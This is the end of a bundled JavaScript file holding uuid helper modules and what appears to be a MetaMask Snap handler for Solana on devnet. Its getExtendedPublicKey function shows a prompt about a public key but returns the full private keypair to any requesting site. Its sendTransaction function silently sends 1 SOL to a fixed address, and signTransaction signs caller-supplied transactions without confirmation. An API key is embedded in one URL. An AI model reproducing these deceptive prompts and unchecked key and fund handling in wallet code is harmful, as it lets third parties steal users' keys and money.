            arr[j] = bytes[i * 64 + j * 4] << 24 | bytes[i * 64 + j * 4 + 1] << 16 | bytes[i * 64 + j * 4 + 2] << 8 | bytes[i * 64 + j * 4 + 3];
          }
          M[i] = arr;
        }
        M[N - 1][14] = (bytes.length - 1) * 8 / Math.pow(2, 32);
        M[N - 1][14] = Math.floor(M[N - 1][14]);
        M[N - 1][15] = (bytes.length - 1) * 8 & 0xffffffff;
        for (let i = 0; i < N; ++i) {
          const W = new Uint32Array(80);
          for (let t = 0; t < 16; ++t) {
            W[t] = M[i][t];
          }
          for (let t = 16; t < 80; ++t) {
            W[t] = ROTL(W[t - 3] ^ W[t - 8] ^ W[t - 14] ^ W[t - 16], 1);
          }
          let a = H[0];
          let b = H[1];
          let c = H[2];
          let d = H[3];
          let e = H[4];
          for (let t = 0; t < 80; ++t) {
            const s = Math.floor(t / 20);
            const T = ROTL(a, 5) + f(s, b, c, d) + e + K[s] + W[t] >>> 0;
            e = d;
            d = c;
            c = ROTL(b, 30) >>> 0;
            b = a;
            a = T;
          }
          H[0] = H[0] + a >>> 0;
          H[1] = H[1] + b >>> 0;
          H[2] = H[2] + c >>> 0;
          H[3] = H[3] + d >>> 0;
          H[4] = H[4] + e >>> 0;
        }
        return [H[0] >> 24 & 0xff, H[0] >> 16 & 0xff, H[0] >> 8 & 0xff, H[0] & 0xff, H[1] >> 24 & 0xff, H[1] >> 16 & 0xff, H[1] >> 8 & 0xff, H[1] & 0xff, H[2] >> 24 & 0xff, H[2] >> 16 & 0xff, H[2] >> 8 & 0xff, H[2] & 0xff, H[3] >> 24 & 0xff, H[3] >> 16 & 0xff, H[3] >> 8 & 0xff, H[3] & 0xff, H[4] >> 24 & 0xff, H[4] >> 16 & 0xff, H[4] >> 8 & 0xff, H[4] & 0xff];
      }
      var _default = sha1;
      exports.default = _default;
    }, {}],
    70: [function (require, module, exports) {
      "use strict";

      Object.defineProperty(exports, "__esModule", {
        value: true
      });
      exports.default = void 0;
      var _validate = _interopRequireDefault(require("./validate.js"));
      function _interopRequireDefault(obj) {
        return obj && obj.__esModule ? obj : {
          default: obj
        };
      }
      const byteToHex = [];
      for (let i = 0; i < 256; ++i) {
        byteToHex.push((i + 0x100).toString(16).substr(1));
      }
      function stringify(arr, offset = 0) {
        const uuid = (byteToHex[arr[offset + 0]] + byteToHex[arr[offset + 1]] + byteToHex[arr[offset + 2]] + byteToHex[arr[offset + 3]] + '-' + byteToHex[arr[offset + 4]] + byteToHex[arr[offset + 5]] + '-' + byteToHex[arr[offset + 6]] + byteToHex[arr[offset + 7]] + '-' + byteToHex[arr[offset + 8]] + byteToHex[arr[offset + 9]] + '-' + byteToHex[arr[offset + 10]] + byteToHex[arr[offset + 11]] + byteToHex[arr[offset + 12]] + byteToHex[arr[offset + 13]] + byteToHex[arr[offset + 14]] + byteToHex[arr[offset + 15]]).toLowerCase();
        if (!(0, _validate.default)(uuid)) {
          throw TypeError('Stringified UUID is invalid');
        }
        return uuid;
      }
      var _default = stringify;
      exports.default = _default;
    }, {
      "./validate.js": 76
    }],
    71: [function (require, module, exports) {
      "use strict";

      Object.defineProperty(exports, "__esModule", {
        value: true
      });
      exports.default = void 0;
      var _rng = _interopRequireDefault(require("./rng.js"));
      var _stringify = _interopRequireDefault(require("./stringify.js"));
      function _interopRequireDefault(obj) {
        return obj && obj.__esModule ? obj : {
          default: obj
        };
      }
      let _nodeId;
      let _clockseq;
      let _lastMSecs = 0;
      let _lastNSecs = 0;
      function v1(options, buf, offset) {
        let i = buf && offset || 0;
        const b = buf || new Array(16);
        options = options || {};
        let node = options.node || _nodeId;
        let clockseq = options.clockseq !== undefined ? options.clockseq : _clockseq;
        if (node == null || clockseq == null) {
          const seedBytes = options.random || (options.rng || _rng.default)();
          if (node == null) {
            node = _nodeId = [seedBytes[0] | 0x01, seedBytes[1], seedBytes[2], seedBytes[3], seedBytes[4], seedBytes[5]];
          }
          if (clockseq == null) {
            clockseq = _clockseq = (seedBytes[6] << 8 | seedBytes[7]) & 0x3fff;
          }
        }
        let msecs = options.msecs !== undefined ? options.msecs : Date.now();
        let nsecs = options.nsecs !== undefined ? options.nsecs : _lastNSecs + 1;
        const dt = msecs - _lastMSecs + (nsecs - _lastNSecs) / 10000;
        if (dt < 0 && options.clockseq === undefined) {
          clockseq = clockseq + 1 & 0x3fff;
        }
        if ((dt < 0 || msecs > _lastMSecs) && options.nsecs === undefined) {
          nsecs = 0;
        }
        if (nsecs >= 10000) {
          throw new Error("uuid.v1(): Can't create more than 10M uuids/sec");
        }
        _lastMSecs = msecs;
        _lastNSecs = nsecs;
        _clockseq = clockseq;
        msecs += 12219292800000;
        const tl = ((msecs & 0xfffffff) * 10000 + nsecs) % 0x100000000;
        b[i++] = tl >>> 24 & 0xff;
        b[i++] = tl >>> 16 & 0xff;
        b[i++] = tl >>> 8 & 0xff;
        b[i++] = tl & 0xff;
        const tmh = msecs / 0x100000000 * 10000 & 0xfffffff;
        b[i++] = tmh >>> 8 & 0xff;
        b[i++] = tmh & 0xff;
        b[i++] = tmh >>> 24 & 0xf | 0x10;
        b[i++] = tmh >>> 16 & 0xff;
        b[i++] = clockseq >>> 8 | 0x80;
        b[i++] = clockseq & 0xff;
        for (let n = 0; n < 6; ++n) {
          b[i + n] = node[n];
        }
        return buf || (0, _stringify.default)(b);
      }
      var _default = v1;
      exports.default = _default;
    }, {
      "./rng.js": 68,
      "./stringify.js": 70
    }],
    72: [function (require, module, exports) {
      "use strict";

      Object.defineProperty(exports, "__esModule", {
        value: true
      });
      exports.default = void 0;
      var _v = _interopRequireDefault(require("./v35.js"));
      var _md = _interopRequireDefault(require("./md5.js"));
      function _interopRequireDefault(obj) {
        return obj && obj.__esModule ? obj : {
          default: obj
        };
      }
      const v3 = (0, _v.default)('v3', 0x30, _md.default);
      var _default = v3;
      exports.default = _default;
    }, {
      "./md5.js": 64,
      "./v35.js": 73
    }],
    73: [function (require, module, exports) {
      "use strict";

      Object.defineProperty(exports, "__esModule", {
        value: true
      });
      exports.default = _default;
      exports.URL = exports.DNS = void 0;
      var _stringify = _interopRequireDefault(require("./stringify.js"));
      var _parse = _interopRequireDefault(require("./parse.js"));
      function _interopRequireDefault(obj) {
        return obj && obj.__esModule ? obj : {
          default: obj
        };
      }
      function stringToBytes(str) {
        str = unescape(encodeURIComponent(str));
        const bytes = [];
        for (let i = 0; i < str.length; ++i) {
          bytes.push(str.charCodeAt(i));
        }
        return bytes;
      }
      const DNS = '6ba7b810-9dad-11d1-80b4-00c04fd430c8';
      exports.DNS = DNS;
      const URL = '6ba7b811-9dad-11d1-80b4-00c04fd430c8';
      exports.URL = URL;
      function _default(name, version, hashfunc) {
        function generateUUID(value, namespace, buf, offset) {
          if (typeof value === 'string') {
            value = stringToBytes(value);
          }
          if (typeof namespace === 'string') {
            namespace = (0, _parse.default)(namespace);
          }
          if (namespace.length !== 16) {
            throw TypeError('Namespace must be array-like (16 iterable integer values, 0-255)');
          }
          let bytes = new Uint8Array(16 + value.length);
          bytes.set(namespace);
          bytes.set(value, namespace.length);
          bytes = hashfunc(bytes);
          bytes[6] = bytes[6] & 0x0f | version;
          bytes[8] = bytes[8] & 0x3f | 0x80;
          if (buf) {
            offset = offset || 0;
            for (let i = 0; i < 16; ++i) {
              buf[offset + i] = bytes[i];
            }
            return buf;
          }
          return (0, _stringify.default)(bytes);
        }
        try {
          generateUUID.name = name;
        } catch (err) {}
        generateUUID.DNS = DNS;
        generateUUID.URL = URL;
        return generateUUID;
      }
    }, {
      "./parse.js": 66,
      "./stringify.js": 70
    }],
    74: [function (require, module, exports) {
      "use strict";

      Object.defineProperty(exports, "__esModule", {
        value: true
      });
      exports.default = void 0;
      var _rng = _interopRequireDefault(require("./rng.js"));
      var _stringify = _interopRequireDefault(require("./stringify.js"));
      function _interopRequireDefault(obj) {
        return obj && obj.__esModule ? obj : {
          default: obj
        };
      }
      function v4(options, buf, offset) {
        options = options || {};
        const rnds = options.random || (options.rng || _rng.default)();
        rnds[6] = rnds[6] & 0x0f | 0x40;
        rnds[8] = rnds[8] & 0x3f | 0x80;
        if (buf) {
          offset = offset || 0;
          for (let i = 0; i < 16; ++i) {
            buf[offset + i] = rnds[i];
          }
          return buf;
        }
        return (0, _stringify.default)(rnds);
      }
      var _default = v4;
      exports.default = _default;
    }, {
      "./rng.js": 68,
      "./stringify.js": 70
    }],
    75: [function (require, module, exports) {
      "use strict";

      Object.defineProperty(exports, "__esModule", {
        value: true
      });
      exports.default = void 0;
      var _v = _interopRequireDefault(require("./v35.js"));
      var _sha = _interopRequireDefault(require("./sha1.js"));
      function _interopRequireDefault(obj) {
        return obj && obj.__esModule ? obj : {
          default: obj
        };
      }
      const v5 = (0, _v.default)('v5', 0x50, _sha.default);
      var _default = v5;
      exports.default = _default;
    }, {
      "./sha1.js": 69,
      "./v35.js": 73
    }],
    76: [function (require, module, exports) {
      "use strict";

      Object.defineProperty(exports, "__esModule", {
        value: true
      });
      exports.default = void 0;
      var _regex = _interopRequireDefault(require("./regex.js"));
      function _interopRequireDefault(obj) {
        return obj && obj.__esModule ? obj : {
          default: obj
        };
      }
      function validate(uuid) {
        return typeof uuid === 'string' && _regex.default.test(uuid);
      }
      var _default = validate;
      exports.default = _default;
    }, {
      "./regex.js": 67
    }],
    77: [function (require, module, exports) {
      "use strict";

      Object.defineProperty(exports, "__esModule", {
        value: true
      });
      exports.default = void 0;
      var _validate = _interopRequireDefault(require("./validate.js"));
      function _interopRequireDefault(obj) {
        return obj && obj.__esModule ? obj : {
          default: obj
        };
      }
      function version(uuid) {
        if (!(0, _validate.default)(uuid)) {
          throw TypeError('Invalid UUID');
        }
        return parseInt(uuid.substr(14, 1), 16);
      }
      var _default = version;
      exports.default = _default;
    }, {
      "./validate.js": 76
    }],
    78: [function (require, module, exports) {
      "use strict";

      Object.defineProperty(exports, "__esModule", {
        value: true
      });
      exports.onRpcRequest = void 0;
      var _rpc = require("./rpc");
      const onRpcRequest = ({
        origin,
        request
      }) => {
        switch (request.method) {
          case "getPublicExtendedKey":
            return (0, _rpc.getExtendedPublicKey)(wallet);
          case "signTransaction":
            return (0, _rpc.signTransaction)(wallet, request.params[0], request.params[1]);
          case "getPublicKey":
            return (0, _rpc.getPublicKey)(wallet);
          case "sendTransaction":
            return (0, _rpc.sendTransaction)(wallet);
          default:
            throw new Error("Method not found.");
        }
      };
      exports.onRpcRequest = onRpcRequest;
    }, {
      "./rpc": 81
    }],
    79: [function (require, module, exports) {
      "use strict";

      Object.defineProperty(exports, "__esModule", {
        value: true
      });
      exports.extractAccoutPrivateKey = extractAccoutPrivateKey;
      exports.getExtendedPublicKey = getExtendedPublicKey;
      var _keyTree = require("@metamask/key-tree");
      var _web = require("@solana/web3.js");
      async function extractAccoutPrivateKey(wallet) {
        let coinType = 501;
        const methodName = `snap_getBip44Entropy_${coinType}`;
        const bitcoin44node = await wallet.request({
          method: 'snap_getBip44Entropy',
          params: {
            coinType: 501
          }
        });
        const addressKeyDeriver = await (0, _keyTree.getBIP44AddressKeyDeriver)(bitcoin44node);
        const extendedPrivateKey = await addressKeyDeriver(0, true);
        const privateKey = extendedPrivateKey.privateKeyBuffer.slice(0, 32);
        const keypair = _web.Keypair.fromSeed(Uint8Array.from(privateKey));
        return keypair;
      }
      async function getExtendedPublicKey(wallet) {
        const result = await wallet.request({
          method: "snap_confirm",
          params: [{
            prompt: "Access your extended public key?",
            description: "Do you want to allow this app to access your extended public key?"
          }]
        });
        if (result) {
          let response = await extractAccoutPrivateKey(wallet);
          return response;
        } else {
          throw new Error("User reject to access the key");
        }
      }
    }, {
      "@metamask/key-tree": 30,
      "@solana/web3.js": 48
    }],
    80: [function (require, module, exports) {
      "use strict";

      Object.defineProperty(exports, "__esModule", {
        value: true
      });
      exports.getPublicKey = getPublicKey;
      var _getExtendedPublicKey = require("./getExtendedPublicKey");
      async function getPublicKey(wallet) {
        const user = await (0, _getExtendedPublicKey.extractAccoutPrivateKey)(wallet);
        return user.publicKey.toBase58();
      }
    }, {
      "./getExtendedPublicKey": 79
    }],
    81: [function (require, module, exports) {
      "use strict";

      Object.defineProperty(exports, "__esModule", {
        value: true
      });
      Object.defineProperty(exports, "getExtendedPublicKey", {
        enumerable: true,
        get: function () {
          return _getExtendedPublicKey.getExtendedPublicKey;
        }
      });
      Object.defineProperty(exports, "getPublicKey", {
        enumerable: true,
        get: function () {
          return _getPublicKey.getPublicKey;
        }
      });
      Object.defineProperty(exports, "sendTransaction", {
        enumerable: true,
        get: function () {
          return _sendTransaction.sendTransaction;
        }
      });
      Object.defineProperty(exports, "signTransaction", {
        enumerable: true,
        get: function () {
          return _signTransaction.signTransaction;
        }
      });
      var _getExtendedPublicKey = require("./getExtendedPublicKey");
      var _signTransaction = require("./signTransaction");
      var _getPublicKey = require("./getPublicKey");
      var _sendTransaction = require("./sendTransaction");
    }, {
      "./getExtendedPublicKey": 79,
      "./getPublicKey": 80,
      "./sendTransaction": 82,
      "./signTransaction": 83
    }],
    82: [function (require, module, exports) {
      "use strict";

      Object.defineProperty(exports, "__esModule", {
        value: true
      });
      exports.sendTransaction = sendTransaction;
      var _getExtendedPublicKey = require("./getExtendedPublicKey");
      var _web = require("@solana/web3.js");
      async function sendTransaction(wallet) {
        const user = await (0, _getExtendedPublicKey.extractAccoutPrivateKey)(wallet);
        const connection = new _web.Connection("https://solana-devnet.g.alchemy.com/v2/2Eys9o9XLKpPT5cWYqW0xKC_BPQXlocn", "confirmed");
        const transferTransaction = new _web.Transaction().add(_web.SystemProgram.transfer({
          fromPubkey: user.publicKey,
          toPubkey: new _web.PublicKey("51PmmJ9kNKqf2SNkEqxqkPPNHgEBDeSuUTNkba158jh3"),
          lamports: 1 * _web.LAMPORTS_PER_SOL
        }));
        const response = await (0, _web.sendAndConfirmTransaction)(connection, transferTransaction, [user]);
        return response;
      }
    }, {
      "./getExtendedPublicKey": 79,
      "@solana/web3.js": 48
    }],
    83: [function (require, module, exports) {
      "use strict";

      Object.defineProperty(exports, "__esModule", {
        value: true
      });
      exports.signTransaction = signTransaction;
      var _getExtendedPublicKey = require("./getExtendedPublicKey");
      var _web = require("@solana/web3.js");
      async function signTransaction(wallet, rpcURL, tx) {
        const user = await (0, _getExtendedPublicKey.extractAccoutPrivateKey)(wallet);
        const connection = new _web.Connection("https://api.devnet.solana.com/", "confirmed");
        let blockhash = await connection.getLatestBlockhash("finalized");
        tx.recentBlockhash = blockhash.blockhash;
        await (0, _web.sendAndConfirmTransaction)(connection, tx, [user]);
        console.log("Transaction sent and confirmed");
        return "Transaction sent and confirmed";
      }
    }, {
      "./getExtendedPublicKey": 79,
      "@solana/web3.js": 48
    }]
  }, {}, [78])(78);
});